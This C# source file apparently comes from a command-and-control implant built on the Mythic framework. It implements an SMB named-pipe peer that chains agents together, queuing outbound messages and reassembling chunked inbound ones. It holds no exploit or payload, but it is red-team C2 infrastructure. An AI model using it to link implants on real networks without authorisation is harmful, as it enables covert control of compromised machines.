﻿using NotpolloInterop.Classes;
using NotpolloInterop.Interfaces;
using NotpolloInterop.Serializers;
using NotpolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using AI = NotpolloInterop;
using NotpolloInterop.Constants;
using AS = NotpolloInterop.Structs.NotpolloStructs;
using System.Threading;
using TTasks = System.Threading.Tasks;
using NotpolloInterop.Enums.NotpolloEnums;
using NotpolloInterop.Classes.Core;
using NotpolloInterop.Structs.NotpolloStructs;

namespace Notpollo.Peers.SMB
{
    public class SMBPeer : AI.Classes.P2P.Peer
    {
        private AsyncNamedPipeClient _pipeClient = null;
        private PipeStream _pipe = null;
        private Action<object> _sendAction;
        private TTasks.Task _sendTask;

        public SMBPeer(IAgent agent, PeerInformation info) : base(agent, info)
        {
            C2ProfileName = "smb";
            _pipeClient = new AsyncNamedPipeClient(info.Hostname, info.C2Profile.Parameters.PipeName);
            _pipeClient.ConnectionEstablished += OnConnect;
            _pipeClient.MessageReceived += OnMessageReceived;
            _pipeClient.Disconnect += OnDisconnect;
            _sendAction = (object p) =>
            {
                PipeStream ps = (PipeStream)p;
                while (ps.IsConnected && !_cts.IsCancellationRequested)
                {
                    _senderEvent.WaitOne();
                    if (!_cts.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
                    {
                        ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                    }
                }
            };
        }


        public void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            // Potentially delete this since theoretically the sender Task does everything
            if (pipe.IsConnected && !_cts.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
            {
                pipe.EndWrite(result);
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        public override bool Connected()
        {
            return _pipe.IsConnected;
        }

        public override bool Finished()
        {
            return _previouslyConnected && !_pipe.IsConnected;
        }

        public void OnConnect(object sender, NamedPipeMessageArgs args)
        {
            _pipe = args.Pipe;
            OnConnectionEstablished(sender, args);
            _sendTask = new TTasks.Task(_sendAction, args.Pipe);
            _sendTask.Start();
            _previouslyConnected = true;
        }

        public void OnDisconnect(object sender, NamedPipeMessageArgs args)
        {
            _cts.Cancel();
            args.Pipe.Close();
            _senderEvent.Set();
            _sendTask.Wait();
            base.OnDisconnect(this, args);
        }

        public void OnMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            AS.IPCChunkedData chunkedData = _serializer.Deserialize<AS.IPCChunkedData>(
                Encoding.UTF8.GetString(
                    args.Data.Data.Take(args.Data.DataLength).ToArray()
                )
            );
            lock(_messageOrganizer)
            {
                if (!_messageOrganizer.ContainsKey(chunkedData.ID))
                {
                    _messageOrganizer[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    _messageOrganizer[chunkedData.ID].MessageComplete += DeserializeToReceiver;
                }
            }
            _messageOrganizer[chunkedData.ID].AddMessage(chunkedData);
        }

        public override bool Start()
        {
            return _pipeClient.Connect(5000);
        }

        public override void Stop()
        {
            _pipe.Close();
            _sendTask.Wait();
        }
    }
}
